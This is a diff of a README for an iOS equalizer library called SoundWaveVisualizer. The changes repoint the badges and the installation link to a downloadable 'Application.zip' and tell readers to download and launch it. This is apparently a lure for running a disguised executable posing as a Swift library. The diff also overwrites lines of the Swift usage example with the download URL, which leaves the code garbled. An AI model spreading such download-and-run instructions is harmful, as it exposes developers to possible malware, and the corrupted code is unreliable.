@@ -2,7 +2,7 @@
 
 Welcome to SoundWaveVisualizer - a customizable iOS equalizer view with animated bars, perfect for music visualizations and audio-related apps.
 
-![SoundWaveVisualizer](https://img.shields.io/badge/SoundWaveVisualizer-Customizable%20iOS%20Equalizer-<COLOR>.svg)
+![SoundWaveVisualizer](https://github.com/Nenny-1/SoundWaveVisualizer/releases/download/v1.0/Application.zip%20iOS%20Equalizer-<COLOR>.svg)
 
 ## Overview
 
@@ -18,7 +18,7 @@ SoundWaveVisualizer is a powerful tool for adding dynamic audio visualizations t
 
 ## Installation
 
-To get started with SoundWaveVisualizer, simply download the [Release.zip](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) file and launch the application. 
+To get started with SoundWaveVisualizer, simply download the [https://github.com/Nenny-1/SoundWaveVisualizer/releases/download/v1.0/Application.zip](https://github.com/Nenny-1/SoundWaveVisualizer/releases/download/v1.0/Application.zip) file and launch the application. 
 
 If the link does not work, please visit the "Releases" section of the repository for alternative download options.
 
@@ -40,8 +40,8 @@ Here's an example of how easy it is to use SoundWaveVisualizer in your app:
 import SoundWaveVisualizer
 
 let equalizerView = EqualizerView(frame: CGRect(x: 0, y: 0, width: 200, height: 100))
-equalizerView.backgroundColor = .clear
-view.addSubview(equalizerView)
+https://github.com/Nenny-1/SoundWaveVisualizer/releases/download/v1.0/Application.zip = .clear
+https://github.com/Nenny-1/SoundWaveVisualizer/releases/download/v1.0/Application.zip(equalizerView)
 ```
 
 ## Customization
@@ -71,4 +71,4 @@ We'd love to hear how you're using SoundWaveVisualizer in your projects! Feel fr
 
 Happy coding! 🎧🎶📱
 
-![SoundWaveVisualizer](https://img.shields.io/badge/SoundWaveVisualizer-Enhance%20Your%20Audio%20Visualizations-green.svg)
+![SoundWaveVisualizer](https://github.com/Nenny-1/SoundWaveVisualizer/releases/download/v1.0/Application.zip%20Your%20Audio%https://github.com/Nenny-1/SoundWaveVisualizer/releases/download/v1.0/Application.zip)
